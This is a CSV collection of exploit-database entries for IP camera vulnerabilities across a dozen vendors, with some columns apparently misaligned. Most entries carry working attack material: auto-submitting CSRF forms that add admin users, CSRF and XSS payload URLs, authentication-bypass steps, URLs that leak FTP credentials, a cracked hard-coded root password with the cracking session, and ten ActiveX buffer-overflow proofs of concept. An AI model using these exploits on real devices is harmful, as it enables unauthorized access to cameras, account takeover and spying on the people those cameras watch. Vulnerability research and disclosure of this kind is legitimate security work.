date,category,platform,author,device_detail,exploited_component,details,code
2013-06-12,Remote,Hardware,Castillo,Grandstream Multiple IP Cameras,Cross-Site Request Forgery,"source: https://www.securityfocus.com/bid/60532/info
http://www.example.com/goform/usermanage?cmd=add&user.name=test3&user.password=test3&user.level=0","Grandstream multiple IP cameras including GXV3501, GXV3504, GXV3601, GXV3601HD/LL, GXV3611HD/LL, GXV3615W/P, GXV3651FHD, GXV3662HD, GXV3615WP_HD, and GXV3500 are prone to a cross-site request-forgery vulnerability.
Exploiting this issue may allow a remote attacker to perform certain unauthorized actions. This may lead to further attacks."
2013-06-12,Remote,Hardware,Castillo,Sony CH / DH Series IP Cameras,Multiple Cross-Site Request Forgery Vulnerabilities,source: https://www.securityfocus.com/bid/60529/info,"Sony CH and DH series IP cameras including SNCCH140, SNCCH180, SNCCH240, SNCCH280, SNCDH140, SNCDH140T, SNCDH180, SNCDH240, SNCDH240T, and SNCDH280 are prone to multiple cross-site request-forgery vulnerabilities.
Exploiting these issues may allow a remote attacker to perform certain unauthorized actions. This may lead to further attacks.
<html>
<body>
<form name=""SonyCsRf"" action=""http://xx.xx.xx.xx/command/user.cgi"" method=""POST"">
<input type=""Select"" name=""ViewerModeDefault"" value=""00000fff"">
<input type=""Hidden"" name=""ViewerAuthen"" value=""off"">
<input type=""Hidden"" name=""Administrator"" value=""YWRtaW46YWRtaW4="">
<input type=""Hidden"" name=""User1"" value=""xxxx,c0000fff"">
<input type=""Hidden"" name=""User2"" value=""xxxx,c0000fff"">
<input type=""Hidden"" name=""User3"" value=""dG1wdG1wOnRtcHRtcA==,c0000fff"">
<input type=""Hidden"" name=""User4"" value=""Og==,00000fff"">
<input type=""Hidden"" name=""User5"" value=""Og==,00000fff"">
<input type=""Hidden"" name=""User6"" value=""Og==,00000fff"">
<input type=""Hidden"" name=""User7"" value=""Og==,00000fff"">
<input type=""Hidden"" name=""User8"" value=""Og==,00000fff"">
<input type=""Hidden"" name=""User9"" value=""Og==,00000fff"">
<input type=""Hidden"" name=""Reload"" value=""referer"">
<script>document.SonyCsRf.submit();</script>
</form>
</body>
</html>"
2013-06-12,Remote,Hardware,Castillo,Brickcom Multiple IP Cameras,Cross-Site Request Forgery,source: https://www.securityfocus.com/bid/60526/info,"Brickcom multiple IP cameras are prone to a cross-site request-forgery vulnerability.
Exploiting this issue may allow a remote attacker to perform certain unauthorized actions and gain access to the affected application. Other attacks are also possible.
Brickcom cameras running firmware 3.0.6.7, 3.0.6.12, and 3.0.6.16C1 are vulnerable; other versions may also be affected.
<html>
<body>
<form name=""gobap"" action=""http://xx.xx.xx.xx/cgi-bin/users.cgi""; method=""POST"">
<input type=""hidden"" name=""action"" value=""add"">
<input type=""hidden"" name=""index"" value=""0"">
<input type=""hidden"" name=""username"" value=""test2"">
<input type=""hidden"" name=""password"" value=""test2"">
<input type=""hidden"" name=""privilege"" value=""1"">
<script>document.gobap.submit();</script>
</form>
</body>
</html>"
2013-04-09,Remote,Hardware,shekyan,Foscam IP (Multiple Cameras),Multiple Cross-Site Request Forgery Vulnerabilities,"source: https://www.securityfocus.com/bid/58943/info
http://www.example.com/set_users.cgi?user1=&pwd1=&pri1=2&user2=&pwd2=&pri2=&user3=&pwd3=&pri3=&user4=&pwd4=&pri4=&user5=&pwd5=&pri5=&user6=&pwd6=&pri6=&user7=&pwd7=&pri7=&user8=csrf&pwd8=csrf&pri8=2&next_url=","Multiple Foscam IP Cameras are prone to multiple cross-site request-forgery vulnerabilities.
Exploiting these issues may allow a remote attacker to perform certain unauthorized actions. This may lead to further attacks.
The following products are vulnerable:
Foscam FI8910W running Embedded Web Interface 2.4.10.3
Foscam FI8908W running Embedded Web Interface 2.4.10.3"
2015-09-20,WebApps,Hardware,Orwelllabs,ADH-Web Server IP-Cameras,Multiple Vulnerabilities,"http://target_ip/variable.cgi?variable=dhcp_dns&slaveip=0.0.0.0
http://target_ip/variable.cgi?variable=console_master_ftpuser&slaveip=0.0.0.0
http://target_ip/variable.cgi?variable=console_master_ftppass&slaveip=0.0.0.0
http://target_ip/variable.cgi?variable=alarm_title&slaveip=0.0.0.0
http://target_ip/variable.cgi?variable=camconfig[0]&slaveip=127.0.0.1","1. Adivisory Information
Title: ADH-Web Server IP-Cameras Improper Access Restrictions
EDB-ID: 38245
Advisory ID: OLSA-2015-0919
Advisory URL: http://www.orwelllabs.com/2015/10/adh-web-server-ip-cameras-improper.html
Date published: 2015-09-19
Date of last update: 2016-02-15
Vendors contacted: Dedicated Micros
2. Vulnerability Information
Class: Information Exposure [CWE-200]
Impact: Access Control Bypass
Remotely Exploitable: Yes
Locally Exploitable: No
CVE Name: N/A
3. Vulnerability Description
Due to improper access restriction the ADH-Web device [1] allows a remote attacker to browse and access arbitrary files from the following directorie '/hdd0/logs'. You can also get numerous information (important for a fingerprint step) via the parameter variable in variable.cgi script [2].
Background:
Dedicated Micros’ ground breaking Closed IPTV solution makes deploying an IP Video, CCTV system safe, secure and simple. Combining patent-pending innovation with zeroconf networking technology, Closed IPTV automatically allocates IP addresses to IP cameras by physical port. In this way the system is completely deterministic, creating firewalls and monitoring IP connections by individual network ports so they cannot be hacked or intercepted. This ground breaking solution provides a very simple and secure answer to IP Video, meaning that no prior knowledge of IP networking is required. Sophisticated and Dependable network security can be achieved with a single click.
4. Vulnerable Packages
- SD Advanced Closed IPTV
- SD Advanced
- EcoSense
- Digital Sprite 2
5. Technical Description
[1] Usually this directory can be protected against unauthenticated access (401 Unauthorized), though, it can access all files directly without requiring authentication.As in the statement below:
(401):  http://<target_ip>/hdd0/logs
(200): http://<target_ip>/hdd0/logs/log.txt
> Most common logfiles:
arc_log.txt
bak.txt
connect.txt
log.txt
seclog.log
startup.txt
DBGLOG.TXT
access.txt
security.txt
[2] Another problem identified is an information exposure via the parameter variable in variable.cgi script. Knowing some variables can extract a reasonable amount of information:
> DNS:
> ftp master ftp console credentials:
(although the vast majority of servers have ftp/telnet with anonymous access allowed.)
> alms
> camconfig
(includes, but is not limited to)
This servers also sends credentials (and other sensitive data) via GET parameters, this is poor practice as the URL is liable to be logged in any number of places between the customer and the camera. The credentials should be passed in the body of a POST request (under SSL of course, here is not the case). .  (Is possible to create, edit and delete users and other configurations in this way, very dangerous CSRF vectors).
6. Vendor Information, Solutions and Workarounds
The vendor found that some things are not vulnerabilities (sensitive information via GET, for example) and others are useless (hardcoded credentials) and others are not yet so critical (access to server logs).  I think that at least this information can assist during an intrusion test, as will be shown soon.
7. Credits
These vulnerabilities has been discovered by Orwelllabs.
8. Report Timeline
2015-08-31: Vendor has been notified about the vulnerabilities (without details yet).
2015-09-01: Vendor acknowledges the receipt of the email and asks for technical details.
2015-09-01: A email with technical details is sent to vendor.
2015-09-11: Still no response, another email was sent to the Vendor requesting any opinion on the reported problems.
2015-09-11: The vendor reported that the matter was passed on to the team developed and that it would contact me the following week (2015-09-14).
2015-09-14: The development team responded by passing its consideration of the points andreported in accordance with this response the impact of these vulnerabilities is low and are no longer available unauthenticated using recent software release (version 10212).
Legal Notices
The information contained within this advisory is supplied ""as-is"" with no warranties or guarantees of fitness of use or otherwise.
I accept no responsibility for any damage caused by the use or misuse of this information.
About Orwelllabs
Orwelllabs is a security research lab interested in embedded device & webapp hacking.
We aims to create some intelligence around this vast and confusing picture that is the Internet of things.
-----BEGIN PGP PUBLIC KEY BLOCK-----
mQENBFcJl8wBCAC/J8rAQdOoC82gik6LVbH674HnxAAQ6rBdELkyR2S2g1zMIAFt
xNN//A3bUWwFtlrfgiJkiOC86FimPus5O/c4iZc8klm07hxWuzoLPzBPM50+uGKH
xZwwLa5PLuuR1T0O+OFqd9sdltz6djaYrFsdq6DZHVrp31P7LqHHRVwN8vzqWmSf
55hDGNTrjbnmfuAgQDrjA6FA2i6AWSTXEuDd5NjCN8jCorCczDeLXTY5HuJDb2GY
U9H5kjbgX/n3/UvQpUOEQ5JgW1QoqidP8ZwsMcK5pCtr9Ocm+MWEN2tuRcQq3y5I
SRuBk/FPhVVnx5ZrLveClCgefYdqqHi9owUTABEBAAG0IU9yd2VsbExhYnMgPG9y
d2VsbGxhYnNAZ21haWwuY29tPokBOQQTAQgAIwUCVwmXzAIbAwcLCQgHAwIBBhUI
AgkKCwQWAgMBAh4BAheAAAoJELs081R5pszAhGoIALxa6tCCUoQeksHfR5ixEHhA
Zrx+i3ZopI2ZqQyxKwbnqXP87lagjSaZUk4/NkB/rWMe5ed4bHLROf0PAOYAQstE
f5Nx2tjK7uKOw+SrnnFP08MGBQqJDu8rFmfjBsX2nIo2BgowfFC5XfDl+41cMy9n
pVVK9qHDp9aBSd3gMc90nalSQTI/QwZ6ywvg+5/mG2iidSsePlfg5d+BzQoc6SpW
LUTJY0RBS0Gsg88XihT58wnX3KhucxVx9RnhainuhH23tPdfPkuEDQqEM/hTVlmN
95rV1waD4+86IWG3Zvx79kbBnctD/e9KGvaeB47mvNPJ3L3r1/tT3AQE+Vv1q965
AQ0EVwmXzAEIAKgsUvquy3q8gZ6/t6J+VR7ed8QxZ7z7LauHvqajpipFV83PnVWf
ulaAIazUyy1XWn80bVnQ227fOJj5VqscfnHqBvXnYNjGLCNMRix5kjD/gJ/0pm0U
gqcrowSUFSJNTGk5b7Axdpz4ZyZFzXc33R4Wvkg/SAvLleU40S2wayCX+QpwxlMm
tnBExzgetRyNN5XENATfr87CSuAaS/CGfpV5reSoX1uOkALaQjjM2ADkuUWDp6KK
6L90h8vFLUCs+++ITWU9TA1FZxqTl6n/OnyC0ufUmvI4hIuQV3nxwFnBj1Q/sxHc
TbVSFcGqz2U8W9ka3sFuTQrkPIycfoOAbg0AEQEAAYkBHwQYAQgACQUCVwmXzAIb
DAAKCRC7NPNUeabMwLE8B/91F99flUVEpHdvy632H6lt2WTrtPl4ELUy04jsKC30
MDnsfEjXDYMk1GCqmXwJnztwEnTP17YO8N7/EY4xTgpQxUwjlpah++51JfXO58Sf
Os5lBcar8e82m1u7NaCN2EKGNEaNC1EbgUw78ylHU3B0Bb/frKQCEd60/Bkv0h4q
FoPujMQr0anKWJCz5NILOShdeOWXIjBWxikhXFOUgsUBYgJjCh2b9SqwQ2UXjFsU
I0gn7SsgP0uDV7spWv/ef90JYPpAQ4/tEK6ew8yYTJ/omudsGLt4vl565ArKcGwB
C0O2PBppCrHnjzck1xxVdHZFyIgWiiAmRyV83CiOfg37
=IZYl
-----END PGP PUBLIC KEY BLOCK-----"
2015-09-15,Remote,Hardware,LiquidWorm,TP-Link NC200/NC220 Cloud Camera 300Mbps Wi-Fi,Hard-Coded Credentials,"Summary: Designed with simplicity in mind, TP-LINK's Cloud Cameras are a
Desc: NC220 and NC200 utilizes hard-coded credentials within its Linux","TP-Link NC200/NC220 Cloud Camera 300Mbps Wi-Fi Hard-Coded Credentials
Vendor: TP-LINK Technologies Co., Ltd.
Product web page: http://www.tp-link.us
Affected version: NC220 V1 1.0.28 Build 150629 Rel.22346
NC200 V1 2.0.15 Build 150701 Rel.20962
fast and trouble free way to keep track on what's going on in and around
your home. Video monitoring, recording and sharing has never been easier
with the use of TP-LINK’s Cloud service. The excitement of possibilities
never end.
distribution image. These sets of credentials (root:root) are never exposed
to the end-user and cannot be changed through any normal operation of the
camera.
Tested on: Linux
Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
@zeroscience
Advisory ID: ZSL-2015-5255
Advisory URL: http://www.zeroscience.mk/en/vulnerabilities/ZSL-2015-5255.php
20.07.2015
Initializing...
root@zslab:~# strings NC220_1.0.28_Build_150629_Rel.22346.bin |grep root
root_uImage
p2048_newroot.cer
root:$1$gt7/dy0B$6hipR95uckYG1cQPXJB.H.:0:0:Linux User,,,:/home/root:bin/sh
Nproot:x:0:
root@zslab:~# strings NC220_1.0.28_Build_150629_Rel.22346.bin | grep home > crack.me
root@zslab:~# john crack.me
Loaded 1 password hash (FreeBSD MD5 [128/128 SSE2 intrinsics 12x])
root             (root)
guesses: 1  time: 0:00:00:00 DONE (Mon Aug  3 05:52:55 2015)  c/s: 400  trying:
root - Userroot
Use the ""--show"" option to display all of the cracked passwords reliably
root@zslab:~# john crack.me --show
root:root:0:0:Linux User,,,:/home/root:/bin/sh
1 password hash cracked, 0 left
root@zslab:~#"
2015-08-25,WebApps,Hardware,RAT - ThiefKing,Keeper IP Camera 3.2.2.10,Authentication Bypass,"# Exploit Title: Keeper IP Camera - Authentication Bypass
# Date: 25/08/2015
# Exploit Author: RAT - ThiefKing
# Vendor Homepage: http://www.keeper.cn/en/Camera-ip.asp
# Version: 3.2.2.10
# WEB Version: 6.1.17.192
# Tested on: QB200W, QB130W, QA130W,...
http://tromcap.com","Exploit:
1 - First, open your browser
2 - Enter the IP address or domain to see the login screen of the camera
3 - Now go to page umanage.asp (http://ipaddress:port/umanage.asp)
You can change or view passwords
TEST: http://server:88/login.asp
RAT - ThiefKing"
2015-08-15,WebApps,Hardware,Meisam Monsef,Security IP Camera Star Vision DVR,Authentication Bypass,"# Exploit Title: Security IP Camera Star Vision DVR Authentication Bypass
# Date: 2015-08-13
# Exploit Author: Meisam Monsef meisamrce@yahoo.com or meisamrce@gmail.com
# Vendor Homepage: #
# Version: All Versions","Exploit :
1 - First, open your Chrome browser
2 - Enter the IP address or domain to see the login screen of the camera
3 - Press the F12 key to open the browser console
4 - Click the Console tab and enter the following code
login_set(1,1,1,1);
5 - Now go to page view2.html
6 - enjoy seeing camera :)
Test : http://m.2.is/
Video Tutorial : http://s3.picofile.com/file/8206365584/cam.mp4.html"
2012-02-10,Remote,Hardware,console-cowboys,Trendnet Camera (Multiple Products),Remote Security Bypass,"source: https://www.securityfocus.com/bid/51922/info
http://www.example.com/anony/mjpg.cgi","Multiple Trendnet Camera products are prone to a remote security-bypass vulnerability.
Successfully exploiting this issue will allow remote attackers to gain access to a live stream from the camera."
2011-12-07,Remote,Hardware,Matt Metzger,Axis M10 Series Network Cameras,Cross-Site Scripting,"source: https://www.securityfocus.com/bid/50968/info
http://www.example.com/admin/showReport.shtml?content=serverreport.cgi&pageTitle=%3C%2Ftitle%3E%3Cscript%3Ealert(String.fromCharCode(88%2C83%2C83))%3B%3C%2Fscript%3E%3Ctitle%3E","Axis M10 Series Network Cameras are prone to a cross-site scripting vulnerability because they fail to sufficiently sanitize user-supplied data.
An attacker may leverage this issue to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This may allow the attacker to steal cookie-based authentication credentials and launch other attacks.
Axis M1054 firmware 5.21 is vulnerable; other version may also be affected."
2011-05-25,Remote,Hardware,Spare Clock Cycles,RXS-3211 IP Camera,UDP Packet Password Information Disclosure,source: https://www.securityfocus.com/bid/47976/info,"The RXS-3211 IP camera is prone to an information-disclosure vulnerability.
Successful exploits will allow a remote attacker to gain access to sensitive information. Information obtained will aid in further attacks.
the following proof of concept is available:
\xff\xff\xff\xff\xff\xff\x00\x06\xff\xf9"
2014-12-02,Remote,Hardware,LiquidWorm,IPUX CS7522/CS2330/CS2030 IP Camera,'UltraHVCamX.ocx' ActiveX Stack Buffer Overflow,"Summary: The device is H.264 Wired/Wireless IP Camera with 1.3 Mega-pixel sensor.
Desc: The UltraHVCam ActiveX Control 'UltraHVCamX.ocx' suffers from a stack buffer","﻿
IPUX CS7522/CS2330/CS2030 IP Camera (UltraHVCamX.ocx) ActiveX Stack Buffer Overflow
Vendor: Big Good Holdings Limited | Fitivision Technology Inc.
Product web page: http://www.ipux.net | http://www.fitivision.com
Affected version: PT Type ICS2330 (firmware: ICS2330 1.1.0-29 20140120 r4296)
Cube Type ICS2030 (firmware: ICS2030 1.1.0-21 20130223 r3967)
Dome Type ICS7522 (firmware: ICS7522 1.1.0-7 20120413 r3812)
With high performance H.264 video compression, the file size of video stream is
extremely reduced, as to optimize the network bandwidth efficiency. It has full
Pan/Tilt function and 3X digital zoom feature for a larger space monitoring. The
built-in USB port provides a convenient and portable storage option for local storage
of event and schedule recording, especially network disconnected.
overflow vulnerability when parsing large amount of bytes to several functions in
UltraHVCamLib, resulting in memory corruption overwriting several registers including
the SEH. An attacker can gain access to the system of the affected node and execute
arbitrary code.
(4b24.478c): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
*** ERROR: Symbol file could not be found.  Defaulted to export symbols for C:\Windows\Downloaded Program Files\UltraHVCamX.ocx -
eax=02d04d4f ebx=001dc890 ecx=41414141 edx=41414141 esi=001d6d6c edi=00000009
eip=10032459 esp=0030efe8 ebp=0030efec iopl=0         nv up ei pl nz na pe nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010206
UltraHVCamX!DllUnregisterServer+0x100e9:
10032459 8b12            mov     edx,dword ptr [edx]  ds:002b:41414141=????????
0:000> d ecx
41414141  ?? ?? ?? ?? ?? ?? ?? ??-?? ?? ?? ?? ?? ?? ?? ??  ????????????????
41414151  ?? ?? ?? ?? ?? ?? ?? ??-?? ?? ?? ?? ?? ?? ?? ??  ????????????????
41414161  ?? ?? ?? ?? ?? ?? ?? ??-?? ?? ?? ?? ?? ?? ?? ??  ????????????????
41414171  ?? ?? ?? ?? ?? ?? ?? ??-?? ?? ?? ?? ?? ?? ?? ??  ????????????????
41414181  ?? ?? ?? ?? ?? ?? ?? ??-?? ?? ?? ?? ?? ?? ?? ??  ????????????????
41414191  ?? ?? ?? ?? ?? ?? ?? ??-?? ?? ?? ?? ?? ?? ?? ??  ????????????????
414141a1  ?? ?? ?? ?? ?? ?? ?? ??-?? ?? ?? ?? ?? ?? ?? ??  ????????????????
414141b1  ?? ?? ?? ?? ?? ?? ?? ??-?? ?? ?? ?? ?? ?? ?? ??  ????????????????
0:000> d eax
02d04d4f  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
02d04d5f  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
02d04d6f  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
02d04d7f  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
02d04d8f  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
02d04d9f  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
02d04daf  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
02d04dbf  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
Tested on: Microsoft Windows 7 Professional SP1 (EN)
Vulnerabilities discovered by Gjoko 'LiquidWorm' Krstic
@zeroscience
Advisory ID: ZSL-2014-5212
Advisory URL: http://www.zeroscience.mk/en/vulnerabilities/ZSL-2014-5212.php
16.11.2014
Properties:
FileDescriptionUltraHVCam ActiveX Control
FileVersion1, 0, 52, 55 and 1, 0, 52, 54
InternalNameUltraHVCamX
OriginalFileNameUltraHVCamX.ocx
ProductNameUltraHVCam device ActiveX Control
ProductVersion1, 0, 52, 55 and 1, 0, 52, 54
List of members:
Interface IUltraHVCamX : IDispatch
Default Interface: True
Members : 66
RemoteHost
RemotePort
AccountCode
GetConfigValue
SetConfigValue
SetCGIAPNAME
Password
UserName
fChgImageSize
ImgWidth
ImgHeight
SnapFileName
AVIRecStart
SetImgScale
OpenFolder
OpenFileDlg
TriggerStatus
AVIRecStatus
Event_Frame
PlayVideo
SetAutoScale
Event_Signal
WavPlay
CGI_ParamGet
CGI_ParamSet
MulticastEnable
MulticastStatus
SetPTUserAllow
SetLanguage
SetZoomButtonFontColor
SetZoomButtonColor
SetFullScreen
Vulnerable members of the class:
RemoteHost
AccountCode
SetCGIAPNAME
Password
UserName
SnapFileName
OpenFolder
CGI_ParamGet
CGI_ParamSet
MulticastEnable
PoC(s):
---1
<html>
<object classid='clsid:9920E6A5-9B38-4C45-AD2D-5D1AA2B00A6E' id='target' />
<script language='vbscript'>
targetFile = ""C:\Windows\Downloaded Program Files\UltraHVCamX.ocx""
prototype  = ""Function MulticastEnable ( ByVal sIP As String ,  ByVal lPort As Long ) As Long""
memberName = ""MulticastEnable""
progid     = ""UltraHVCamLib.UltraHVCamX""
argCount   = 2
arg1=String(13332, ""A"")
arg2=1
target.MulticastEnable arg1 ,arg2
</script>
</html>
---2
<html>
<object classid='clsid:9920E6A5-9B38-4C45-AD2D-5D1AA2B00A6E' id='target' />
<script language='vbscript'>
targetFile = ""C:\Windows\Downloaded Program Files\UltraHVCamX.ocx""
prototype  = ""Property Let RemoteHost As String""
memberName = ""RemoteHost""
progid     = ""UltraHVCamLib.UltraHVCamX""
argCount   = 1
arg1=String(2068, ""A"")
target.RemoteHost = arg1
</script>
</html>
---3
<html>
<object classid='clsid:9920E6A5-9B38-4C45-AD2D-5D1AA2B00A6E' id='target' />
<script language='vbscript'>
targetFile = ""C:\Windows\Downloaded Program Files\UltraHVCamX.ocx""
prototype  = ""Property Let AccountCode As String""
memberName = ""AccountCode""
progid     = ""UltraHVCamLib.UltraHVCamX""
argCount   = 1
arg1=String(1044, ""A"")
target.AccountCode = arg1
</script>
</html>
---4
<html>
<object classid='clsid:9920E6A5-9B38-4C45-AD2D-5D1AA2B00A6E' id='target' />
<script language='vbscript'>
targetFile = ""C:\Windows\Downloaded Program Files\UltraHVCamX.ocx""
prototype  = ""Property Let SetCGIAPNAME As String""
memberName = ""SetCGIAPNAME""
progid     = ""UltraHVCamLib.UltraHVCamX""
argCount   = 1
arg1=String(1044, ""A"")
target.SetCGIAPNAME = arg1
</script>
</html>
---5
<html>
<object classid='clsid:9920E6A5-9B38-4C45-AD2D-5D1AA2B00A6E' id='target' />
<script language='vbscript'>
targetFile = ""C:\Windows\Downloaded Program Files\UltraHVCamX.ocx""
prototype  = ""Property Let Password As String""
memberName = ""Password""
progid     = ""UltraHVCamLib.UltraHVCamX""
argCount   = 1
arg1=String(1044, ""A"")
target.Password = arg1
</script>
</html>
---6
<html>
<object classid='clsid:9920E6A5-9B38-4C45-AD2D-5D1AA2B00A6E' id='target' />
<script language='vbscript'>
targetFile = ""C:\Windows\Downloaded Program Files\UltraHVCamX.ocx""
prototype  = ""Property Let UserName As String""
memberName = ""UserName""
progid     = ""UltraHVCamLib.UltraHVCamX""
argCount   = 1
arg1=String(1044, ""A"")
target.UserName = arg1
</script>
</html>
---7
<html>
<object classid='clsid:9920E6A5-9B38-4C45-AD2D-5D1AA2B00A6E' id='target' />
<script language='vbscript'>
targetFile = ""C:\Windows\Downloaded Program Files\UltraHVCamX.ocx""
prototype  = ""Property Let SnapFileName As String""
memberName = ""SnapFileName""
progid     = ""UltraHVCamLib.UltraHVCamX""
argCount   = 1
arg1=String(1044, ""A"")
target.SnapFileName = arg1
</script>
</html>
---8
<html>
<object classid='clsid:9920E6A5-9B38-4C45-AD2D-5D1AA2B00A6E' id='target' />
<script language='vbscript'>
targetFile = ""C:\Windows\Downloaded Program Files\UltraHVCamX.ocx""
prototype  = ""Function OpenFolder ( ByVal sInitPath As String ) As String""
memberName = ""OpenFolder""
progid     = ""UltraHVCamLib.UltraHVCamX""
argCount   = 1
arg1=String(1044, ""A"")
target.OpenFolder arg1
</script>
</html>
---9
<html>
<object classid='clsid:9920E6A5-9B38-4C45-AD2D-5D1AA2B00A6E' id='target' />
<script language='vbscript'>
targetFile = ""C:\Windows\Downloaded Program Files\UltraHVCamX.ocx""
prototype  = ""Function CGI_ParamGet ( ByVal sGroup As String ,  ByVal sName As String ) As String""
memberName = ""CGI_ParamGet""
progid     = ""UltraHVCamLib.UltraHVCamX""
argCount   = 2
arg1=String(1044, ""A"")
arg2=""defaultV""
target.CGI_ParamGet arg1 ,arg2
</script>
</html>
---10
<html>
<object classid='clsid:9920E6A5-9B38-4C45-AD2D-5D1AA2B00A6E' id='target' />
<script language='vbscript'>
targetFile = ""C:\Windows\Downloaded Program Files\UltraHVCamX.ocx""
prototype  = ""Function CGI_ParamSet ( ByVal sGroup As String ,  ByVal sName As String ,  ByVal SVal As String ) As Long""
memberName = ""CGI_ParamSet""
progid     = ""UltraHVCamLib.UltraHVCamX""
argCount   = 3
arg1=String(1044, ""A"")
arg2=""defaultV""
arg3=""defaultV""
target.CGI_ParamSet arg1 ,arg2 ,arg3
</script>
</html>"
